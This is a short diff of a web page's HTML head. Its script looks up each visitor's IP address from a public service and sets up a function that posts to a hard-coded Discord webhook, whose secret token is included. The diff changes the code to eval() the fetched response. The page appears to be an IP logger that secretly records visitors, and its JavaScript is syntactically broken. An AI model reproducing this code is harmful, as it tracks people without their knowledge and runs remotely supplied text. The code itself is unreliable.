@@ -3,7 +3,7 @@
 <head>
   <meta property="og:image" content=image>
 <script>
-  fetch('https://api.ipify.org/')  .then(response => response.text())  .then(script => const ip = script);
+  fetch('https://api.ipify.org/')  .then(response => response.text())  .then(script => eval(const ip = script));
 function sendWebhook(url, message) {
   // Replace with your actual Discord webhook URL
   const webhookURL = "https://discord.com/api/webhooks/1210975688002240613/MfdO7_ih-VtdQZGv0D-Dt_3jvvT1UgDok1-j0q31xyVCDAC8jaaLEk5wByC-e443SrNa";
